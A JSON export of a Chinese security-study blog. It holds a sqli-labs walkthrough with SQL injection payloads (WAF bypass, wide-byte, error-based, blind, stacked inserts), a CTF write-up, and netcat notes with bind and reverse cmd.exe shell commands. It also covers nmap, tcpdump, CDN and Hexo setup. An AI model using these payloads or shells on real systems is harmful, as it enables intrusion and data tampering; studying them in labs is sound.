针对大小写防止，可以通过函数进行大小写转换，然后过滤 盲注：0&#39;)||left(database(),1)=&#39;s&#39;;%00 29.获取-基于错误的缺乏证据的不匹配-在 web 应用程序前面有一个 WAF 遇到新知识了，有点不懂。参考mysql 注入-二层服务器架构 12服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程为：client访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。Explain：apache（php）解析最后一个参数，即显示id&#x3D;2的内容。Tomcat（jsp）解析第一个参数，即显示id&#x3D;1的内容。 源码:有多了两个文件：hacked.php–负责报错页面,login.php–担任一个 waf 的角色。 id=1&amp;&amp;id=0&#39;union select 1,2,3 --+两个 id 参数，第一个 id 传给 jsp 服务器，第二个传给 php 服务器，不会被过滤，实现注入 30.获取-基于错误的缺乏证据的不匹配-在 web 应用程序前面有一个 WAF(盲注) 时间盲注：1&quot; and if(left(database(),1)=&#39;s&#39;, sleep(5),1)--+ union 注入:id=1&amp;&amp;id=0&quot; union select 1,2,database()--+ 31.获取-基于错误的缺乏证据的不匹配-在 web 应用程序前面有一个 WAF 发现”)报错(和 29 题相同):id=1&amp;&amp;id=0&quot;) union select 1,2,database()--+ 有报错显示，所以存在报错注入:id=1&amp;&amp;id=0&quot;) and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+ 32.bypass Addslashes()—宽字节注入 宽字节注入原理:GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符(一字节)的现象，即将两个 ascii 字符误认为是一个宽字节字符。 id=-1%df&#39; union select 1,2,database() --+回显成功 爆列名:?id=-1%E6&#39; union select 1,version(),group_concat(column_name) from information_schema.columns where table_name =0x7573657273--+注意：表名-user 需要使用’’,这里可以使用 0x 的绕过，并且使用 user 的十六进制，即 0x7573657273` 33.和 32 一模一样。。。。。34.POST 型的 bypass Addslashes() uname=-1%df&#39; union select 1,database()--+&amp;passwd=aa&amp;submit=Submit和 get 绕过一样 35.bypass Addslashes()-整数 这里不需要闭合的符号。整数型， -1 union select 1,2,3--+ 36.GET 型的绕过MySQL_real escape_string 先来看看这个函数 函数转义 SQL 语句中使用的字符串中的特殊字符。1234567891011下列字符受影响： \\x00 \\n \\r \\ &#39; &quot; \\x1a如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。而这个函数可以通过以下语句绕过aaa&#39; OR 1&#x3D;1 -- 0%df&#39; union select 1,2,database() --+成功注入 37.POST 型的绕过MySQL_real escape_string 和注入一样。。uname=0%df&#39; union select 1,database() --+&amp;passwd=admin&amp;submit=Submit PAGE-3(Stacked Challenges)38.层次化查询,–也叫做堆叠注入 mysqli_more_results() 函数:检查一个多查询是否有更多的结果。 mysqli_multi_query()函数:执行一个或者多个查询语句 mysqli_store_result()函数: 转移上一次查询返回的结果集 39.Stacked Query Injection 整数型的堆叠注入:id=1; insert into users(id,password,username) value(&#39;17&#39;,&#39;a&#39;,&#39;a&#39;) 部分源码 1234567891011121314151617sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql))&#123; /* store first result set */ if ($result = mysqli_store_result($con1)) &#123; if($row = mysqli_fetch_row($result)) &#123; echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;; printf(&quot;Your Username is : %s&quot;, $row[1]); echo &quot;&lt;br&gt;&quot;; printf(&quot;Your Password is : %s&quot;, $row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; 40.GET-BLIND - based - String - stacked id=1&#39;);insert into users(id,password,username) value(&#39;18&#39;,&#39;b&#39;,&#39;b&#39;)--+ 41.BLIND based - Intiger - Stacked(整数) id=1;insert into user(id,password,usename) value(&#39;19&#39;,&#39;c&#39;,&#39;c&#39;)--+ 42.POST 型的堆叠注入 sqlmap 一把梭哈:sqlmap -r /etc/sqlmap/post42.txt -level 3 手工注入 源码中对 username 进行的 mysqli_real_escape_string 函数的转义，但是对 password 没有任何过滤所以这参数 password 这里存在注入点， 堆叠注入–payload:0&#39;;create table aaa like users--+,成功在 mysql 数据库中建立了名为 aaa 的表 43.POST 型的堆叠注入 相比 42 题，闭合符号变成了’) 44.POST - Error based - String - Stacked -Blind 相比于 42 题，44 没有报错显示 login_password=b&#39;;insert into users(id,password,username) value(&#39;20&#39;,&#39;cc&#39;,&#39;cc&#39;)--+ 45.POST - Error based - String - Stacked -Blind 相比 44 题，闭合符号变成了’) payload:login_password=b&#39;);insert into users(id,password,username) value(&#39;20&#39;,&#39;cc&#39;,&#39;cc&#39;)--+ 46.ORDER BY-Error-Numeric 对于 sort 参数的原理有点陌生，贴出源码 12345678910$id=$_GET[&#x27;sort&#x27;];if(isset($id)) &#123; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\\n&quot;); fclose($fp); $sql = &quot;SELECT * FROM users ORDER BY $id&quot;; $result = mysqli_query($con1, $sql); 当输入 sort=4 时，报错显示，没有相应的字段，存在报错注入 payload:sort=4 and updatexml(1,concat(0x7e,(select version()),0x7e),1) 47.ORDER BY Clause-Error-Single quote 相比于 46，这里通过’来闭合 基于 procedure analyse 注入sort=1&#39;procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+ 基于 update 小 xml 的注入sort=1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+ 48.ORDER BY Clause Blind based 布尔盲注 if(ascii(left(database,1))=115) 49.ORDER BY Clause Blind based 时间盲注:sort=1 and if(left(database(),1)=&#39;s&#39;,sleep(1),1)--+很奇怪，时间延迟注入会一直延迟访问。。。。 50.GET - Error based - ORDER BY CLAUSE -num … 报错显示:sort=4 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+ 51.GET - Error based - ORDER BY CLAUSE-Stri … 相比 50 题，&#39;号闭合 报错注入:sort=1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+ 52.GET - Blind based - ORDER BY CLAUSE -num … 没有错误回显 时间延迟注入:1 and if(left(database(),1)=&#39;x&#39;,sleep(4),0)--+ 布尔注入:1 and left(database(),1)=&#39;x&#39;--+1 and ascii(substr(database(),1,1))=115--+ 源码中使用了 mysqli_multi_query()函数:可能存在堆叠注入payload:sort=2;create table ff like users--+成功创建 53.GET - GET - Blind based - ORDER BY CLAUS-Stri … 一个问题:为什么 sort 设置为任何整数，页面的表格没有变化，且正常回显第一页呢？这里可以看成只有正确和错误，所以这道题做法基本就是盲注了 时间延迟注入:sort=2&#39; and if(length(database())=1,0,sleep(5))--+ 54.GET-challenge-Union-10 queries allowed-Variation 1 基本注入步骤即可 55.GET-challenge-Union-14 queries allowed-Variation 2 闭合尝试—最后发现是）闭合然后就是基本的注入步骤 56.GET-challenge-Union-14 queries allowed-Variation 3 刚开始尝试–1&quot;--+发现能够正确回显，但是 union 语句使用，不能显示。阅读源码才知道是&#39;)闭合。。那么为什么1&quot;--+会正确回显呢？ PAGE-4(Challenges)57. &quot;闭合方式，然后就是基本注入步骤 58.GET-challenge-Double Query-5 queries allowed-Variation 1 双注入没有用到，选择了报错注入 双注入(基于 floor)： 59.GET-challenge-Double Query-5 queries allowed-Variation 2 没有闭合符号的报错注入 60.GET-challenge-Double Query-5 queries allowed-Variation 3 &quot;)闭合方式。报错或者双注入报错即可 61.GET-challenge-Double Query-5 queries allowed-Variation 4 &#39;))的闭合方式，报错或者双注入报错即可 62. GET-challenge-Blind- 130 queries allowed -variation 1 以后的几题都是盲注，需要使用脚本自动爆破注入。","categories":[{"name":"靶机","slug":"靶机","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://example.com/tags/sql/"}]},{"title":"红帽杯","slug":"CTF比赛/红帽杯","date":"2021-03-06T14:06:06.000Z","updated":"2021-06-06T07:51:58.532Z","comments":true,"path":"2021/03/06/CTF比赛/红帽杯/","link":"","permalink":"http://example.com/2021/03/06/CTF%E6%AF%94%E8%B5%9B/%E7%BA%A2%E5%B8%BD%E6%9D%AF/","excerpt":"","text":"find_it 知识点 vim 备份文件 短标签 robots.txt 文件提示有 1ndexx.php，但是访问不了存在 vim 备份文件：http://eci-2zefc95c45rhg0wuefre.cloudeci1.ichunqiu.com/.1ndexx.php.swp 得到源码，/index.php?code=&lt;?=phpinfo();?&gt; 发现 flag 在 phpinfo()的全局变量中 framework 知识点 Yii 框架 反序列化 www.zip 的到框架的源码，本地搭建，获取框架的版本参考Yii 反序列漏洞 WebsiteManger 知识点 sql 盲注 ssrf sql 盲注得到密码，登录后进入 curl.php 文件中，直接file:///flag得到 flag ezlight 知识点 LightCMS 框架 Phar 反序列","categories":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"Nmap","slug":"工具使用/nmap","date":"2021-03-01T12:53:43.000Z","updated":"2021-03-22T15:56:31.231Z","comments":true,"path":"2021/03/01/工具使用/nmap/","link":"","permalink":"http://example.com/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/nmap/","excerpt":"","text":"nmap HOST 123456-iL #读取IP列表文件-iR #随机选择目标--exclude &lt;host&gt; #除外一些IP-sL #子网掩码计算，显示要扫的IP-n #不做dns解析--dns-server #指定dns-server，可以访问国外的 PORT 12345678-sS:半连接扫描，发送SYN数据包，不会在对方主机日志中进行记录-sT #TCP扫描-sU #UDP扫描-sA:半连接扫描，发送ACK数据包，不会在对方主机日志中进行记录--scanflags #指定flags-sI #僵尸扫描-sY #SCTP协议-sO #IP协议 PORT SPECIFICATION 123-p U:&lt;port&gt; &lt;IP&gt;#指定端口，UDP扫描-F:Fast mode(快速模式)，仅扫描前100个端口-r #按顺序扫描 SERVICE 12-sV:扫描开放的端口所对应服务的版本--version-intensity #指定扫描的深入程度 OS-O:扫描目标主机的操作系统","categories":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"Netcat","slug":"工具使用/netcat","date":"2021-03-01T12:53:43.000Z","updated":"2021-03-22T15:47:51.458Z","comments":true,"path":"2021/03/01/工具使用/netcat/","link":"","permalink":"http://example.com/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/netcat/","excerpt":"","text":"nc 使用:透过使用 TCP 或 UDP 协议的网络连接去读写数据 -d 后台模式-e prog 程序重定向，一旦连接，就执行 [危险!!]-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, …-h 帮助信息-i secs 延时的间隔-l 监听模式，用于入站连接-L 连接关闭后,仍然继续监听-n 指定数字的 IP 地址，不能用 hostname-o file 记录 16 进制的传输-p port 本地端口号-r 随机本地及远程端口-s addr 本地源地址-t 使用 TELNET 交互方式-u UDP 模式-v 详细输出–用两个-v 可得到更详细的内容-w secs timeout 的时间-z 将输入输出关掉–用于扫描时 端口的表示方法可写为 M-N 的范围格式。 基本用法： 大概有以下几种用法： 1)连接到 REMOTE 主机，例子：格式：nc -nvv 192.168.x.x 80讲解：连到 192.168.x.x 的 TCP80 端口 2)监听 LOCAL 主机，例子：格式：nc -l -p 80讲解：监听本机的 TCP80 端口 3)扫描远程主机，例子：格式：nc -nvv -w2 -z 192.168.x.x 80-445讲解：扫描 192.168.x.x 的 TCP80 到 TCP445 的所有端口 4)REMOTE 主机绑定 SHELL，例子：格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe讲解：绑定 REMOTE 主机的 CMDSHELL 在 REMOTE 主机的 TCP5354 端口 5)REMOTE 主机绑定 SHELL 并反向连接，例子：格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354讲解：绑定 REMOTE 主机的 CMDSHELL 并反向连接到 192.168.x.x 的 TCP5354 端口 以上为最基本的几种用法（其实 NC 的用法还有很多，当配合管道命令“|”与重定向命令“&lt;”、“&gt;”等等命令功能更强大……）。 高级用法： 6)作攻击程序用，例子：格式 1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80格式 2：nc -nvv 192.168.x.x 80 &lt; c:exploit.txt讲解：连接到 192.168.x.x 的 80 端口，并在其管道中发送 c:exploit.txt 的内容(两种格式确有相同的效果，真是有异曲同工之妙:P) 附：c:exploit.txt 为 shellcode 等 7)作蜜罐用[1]，例子：格式：nc -L -p 80讲解：使用-L(注意 L 是大写)可以不停地监听某一个端口，直到 ctrl+c 为止. 8)作蜜罐用[2]，例子：格式：nc -L -p 80 &gt; c:log.txt讲解：使用-L 可以不停地监听某一个端口，直到 ctrl+c 为止，同时把结果输出到 c:log.txt 中，如果把‘&gt;’改为‘&gt;&gt;’即可以追加日志。 附：c:log.txt 为日志等 9)作蜜罐用[3]，例子：格式 1：nc -L -p 80 &lt; c:honeypot.txt格式 2：type.exe c:honeypot.txt|nc -L -p 80讲解：使用-L 可以不停地监听某一个端口，直到 ctrl+c 为止，并把 c:honeypot.txt 的内容‘送’入其管道中。 Linux kali 开启端口、关闭防火墙方法 nc -lp 23:打开 23 端口，但是需要监听 netstat -an | grep 23:查询 23 端口是否打开 telnet:查看某个端口是否可访问 netstat -antup |grep 9998:查看监听","categories":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"wireshark-tcpdump","slug":"工具使用/wireshark-tcpdump","date":"2021-03-01T12:53:43.000Z","updated":"2021-03-22T15:57:25.788Z","comments":true,"path":"2021/03/01/工具使用/wireshark-tcpdump/","link":"","permalink":"http://example.com/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/wireshark-tcpdump/","excerpt":"","text":"一. wireshark 主界面介绍 选择网卡后进入拦截界面。这里 1 号窗口表示 wireshark 捕获到的所有数据包的列表，注意最后一列 info 是组织说明列，不一定是该数据包中的原始内容；2 号窗口是 1 号窗口中选定的数据包的分层协议展示；3 号窗口表示 1 号窗口中选定的数据包的原始数据，其中左侧十六进制表示，右侧 ascii 码表示。在 2 号窗口选中某层，3 号窗口对应位置会高亮。 在我们想抓取时对数据包进行过滤，就选择——捕获——选项，然后选择抓取的网卡，下面再选择过滤器。设置好后就可以开始抓包 抓取后的过滤 一般情况下，我们都是抓取完数据后进行过滤的，在上方输入相应的语法，对数据包进行筛选。 过滤的语法初次相识，都会被这个过滤的语法搞懵逼。这里总结一下格式：一条基本的表达式由过滤项、过滤关系、过滤值组成。而其中难点就在于过滤项，过滤项模式为：协议+.+协议字段 。比如：ip.addr==192.168.10.10 其中 ip 为协议，addr 为协议字段，==为过滤关系，192.168.10.10 为过滤值。 着色规则 另外我们捕获的数据包都会呈现出不同的颜色，那么我们怎么知道代表什么意思呢？可以通过视图——着色规则来查看 数据包的大致结构 12345第一行：数据包整体概述，第二行：链路层详细信息，主要的是双方的mac地址第三行：网络层详细信息，主要的是双方的IP地址第四行：传输层的详细信息，主要的是双方的端口号。第五行：域名系统相关信息 数据流的追踪我们的一个完整的数据流一般都是由很多个包组成的，所以当我们想查看某条数据包对于的数据流的话。可以选中数据，右键选择追踪流。里面就会有 tcp 流、udp 流、ssl 流、http 流。数据包属于哪种流就选择对应的流。 数据包的统计分析在统计一栏中，可以对抓取的数据包进一步的分析。比如数据包的属性、已解析的地址、协议分级等。 安全方面的小技巧 123456大量404请求——&gt; 目录扫描大量 select....from 关键字请求——&gt; SQL注入连续一个ip的多端口请求或多个ip的几个相同端口请求——&gt; 端口扫描黑客爆破账户和密码，则是post请求 http.request.method&#x3D;&#x3D;POST黑客修改文件， ip.addr&#x3D;&#x3D;219.239.105.18 and http.request.url matches &quot;edit|upload|modify&quot;如果是用菜刀连接的包，则是post请求 ip.addr&#x3D;&#x3D;219.239.105.18 and http.request.method&#x3D;&#x3D;POST 实例：wireshark 实例 二、tcpdump：命令行的抓包工具 抓包 默认之抓包 68 个字节 tcpdump -i eth0 -s 0 -w file.pcap 如果想要抓某一端口的包可以使用 Tcpdump -i eth0 port 22 读取抓包文件 Tcpdump -r file.pcap * TCPDUMP——筛选 12345tcpdump -n -r http.cap | wak&#39;&#123;print$3&#125;&#39;|sort -utcpdump -n src host 145.254.160.237 -r http.captcpdump -n dst host 145.254.160.237 -r http.captcpdump -n port 53 -r http.captcpdump -n -X port 80 -r http.cap -X 告诉 tcpdump 命令，需要把协议头和包内容都原原本本的显示出来（tcpdump 会以 16 进制和 ASCII 的形式显示），这在进行协议分析时是绝对的利器。 -c 是 Count 的含义，这设置了我们希望 tcpdump 帮我们抓几个包 -n 不把网络地址转换成名字 关于类型的关键字，主要包括 host，net，port, 例如 host 210.45.114.211，指定主机 210.45.114.211，net 210.11.0.0 指明 210.11.0.0 是一个网络地址，* port 21 指明端口号是 21。 关于传输方向的关键字，主要包括 src , dst ,dst or src, dst and src 关于协议的关键字，主要包括 ether,ip,ip6,arp,rarp,tcp,udp 等类型,如我们只想抓 tcp 的包命令为: sudo tcpdump -i eth0 -nn -c1 ‘tcp’","categories":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"CDN","slug":"CDN讲解","date":"2021-02-15T12:25:45.000Z","updated":"2021-03-20T14:19:07.291Z","comments":true,"path":"2021/02/15/CDN讲解/","link":"","permalink":"http://example.com/2021/02/15/CDN%E8%AE%B2%E8%A7%A3/","excerpt":"","text":"什么是 CDN CDN 工作原理内容分发网络（Content Delivery Network，简称 CDN）是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络 最简单的 CDN 可以通过一个 DNS 服务器和多个缓存服务器组成。 例子讲解假设通过 CDN 加速的域名为www.a.com，接入CDN网络，开始使 用加速服务后，当终端用户（北京）发起 HTTP 请求时，处理流程如下： 当终端用户（北京）向www.a.com下的指定资源发起请求时，首先向LDNS（本地DNS）发起域名解析请求。LDNS检查缓存中是否有www.a.com的IP地址记录。如果有，则直接返回给终端用户；如果没有，则向授权DNS查询。 当授权 DNS 解析www.a.com时，返回域名CNAME www.a.tbcdn.com对应IP地址。域名解析请求发送至阿里云DNS调度系统，并为请求分配最佳节点IP地址。 LDNS 获取 DNS 返回的解析 IP 地址。用户获取解析 IP 地址。用户向获取的 IP 地址发起对该资源的访问请求。 如果该 IP 地址对应的节点已缓存该资源，则会将数据直接返回给用户，例如，图中步骤 7 和 8，请求结束。如果该 IP 地址对应的节点未缓存该资源，则节点向源站发起对该资源的请求。获取资源后，结合用户自定义配置的缓存策略，将资源缓存至节点，例如，图中的北京节点，并返回给用户，请求结束。 从这个例子可以了解到：（1）CDN 的加速资源是跟域名绑定的。（2）通过域名访问资源，首先是通过 DNS 分查找离用户最近的 CDN 节点（边缘服务器）的 IP（3）通过 IP 访问实际资源时，如果 CDN 上并没有缓存资源，则会到源站请求资源，并缓存到 CDN 节点上，这样，用户下一次访问时，该 CDN 节点就会有对应资源的缓存了。","categories":[{"name":"知识普及","slug":"知识普及","permalink":"http://example.com/categories/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/"}],"tags":[{"name":"知识普及","slug":"知识普及","permalink":"http://example.com/tags/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/"}]},{"title":"Burp suit","slug":"工具使用/工具使用","date":"2020-11-26T11:53:43.000Z","updated":"2021-02-01T09:53:11.973Z","comments":true,"path":"2020/11/26/工具使用/工具使用/","link":"","permalink":"http://example.com/2020/11/26/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","excerpt":"","text":"0x00前言不积跬步无以至千里， 不积小流无以成江海。 这里开始我的工具总结之路 0x01 Burp suit参照burp suit使用详解 由于经常使用burp，所以就不做了 0x02 beef1.介绍2.使用 0x03 dirb1.介绍2.使用 字典目录在usr/share/wordlists下 0x04 dirbuster已经很详细了。。 0x05 dirsearch -u 指定url -e 指定网站语言 -w 可以加上自己的字典（带上路径） -r 递归查找 –random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加） 挺简单的。注：-e *表示没有语言规定 0x06 明小子或许由于太古老，所以没有找到 不过知道是用来sql注入的 0x07 edjpcom主要是把一句话木马插入到图片中， 使用： 0x08 Seay源代码审计系统找不到，下了个绿色网站上的，呜呜。。。","categories":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}]},{"title":"Mac下基于GitHub的Hexo博客搭建","slug":"my first blog","date":"2020-10-15T07:19:36.000Z","updated":"2021-03-24T15:48:43.533Z","comments":true,"path":"2020/10/15/my first blog/","link":"","permalink":"http://example.com/2020/10/15/my%20first%20blog/","excerpt":"","text":"Mac下基于GitHub的Hexo博客搭建及更换主题。（命令基于root权限下）一、node.js安装（用于生成静态页面） 直接通过官网下载https://link.zhihu.com/?target=https%3A//nodejs.org/en/，并且安装。 通过node -v来检查是否安装成功。 二、Git安装及配置（将本地内容提交到GitHub（已注册）上） 在终端输入brew install git来下载，git -v检查安装成功（Mac下brew安装详见） ssh配置关联GitHub仓库详见https://blog.csdn.net/linhai1028/article/details/81436825?biz_id=102&amp;utm_term=Mac%E4%B8%8Bgit&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-81436825&amp;spm=1018.2118.3001.4187 三、hexo安装（通过npm） 更新安装源：npm config set regitory https://regitory.npm.taobao.org（如不更换，安装会卡住） 验证是否更新成功：npm config get regitory 安装cnpm：npm install -g cnpm --registry=https://registry.npm.taobao.org 安装hexo：npm install -g hexo-cli 四、hexo初始化 mkdir blog cd blog/ hexo init//hexo初始化 hexo g生成静态页面,hexo s之后即可访问http://localhost:4000（不要停止终端） 五、hexo部署到GitHub 进入blog文件夹，可以看到_ config.yml文件(blog配置文件)。 拉到底部，配置如下（repsitory是仓库的地址）： 在blog下的终端输入npm install hexo-deployer-git --save 输入： hexo clean hexo g hexo d 六、完成 打开浏览器，输入https://xxx.github.io（xxx是GitHub的用户名），即可访问。 更换主题(优化问题，以后再写吧)在bolg文件夹的themes文件下下载主题。二、配置blog下的_config.yml文件中的theme，选择对应的主题。hexo s即可在本地访问。 hexo g,hexo d,上传GitHub。 详见https://easyhexo.com/","categories":[{"name":"小问题","slug":"小问题","permalink":"http://example.com/categories/%E5%B0%8F%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"小问题","slug":"小问题","permalink":"http://example.com/tags/%E5%B0%8F%E9%97%AE%E9%A2%98/"}]}],"categories":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"},{"name":"靶机","slug":"靶机","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"知识普及","slug":"知识普及","permalink":"http://example.com/categories/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/"},{"name":"小问题","slug":"小问题","permalink":"http://example.com/categories/%E5%B0%8F%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"},{"name":"upload","slug":"upload","permalink":"http://example.com/tags/upload/"},{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"sql","slug":"sql","permalink":"http://example.com/tags/sql/"},{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"知识普及","slug":"知识普及","permalink":"http://example.com/tags/%E7%9F%A5%E8%AF%86%E6%99%AE%E5%8F%8A/"},{"name":"小问题","slug":"小问题","permalink":"http://example.com/tags/%E5%B0%8F%E9%97%AE%E9%A2%98/"}]}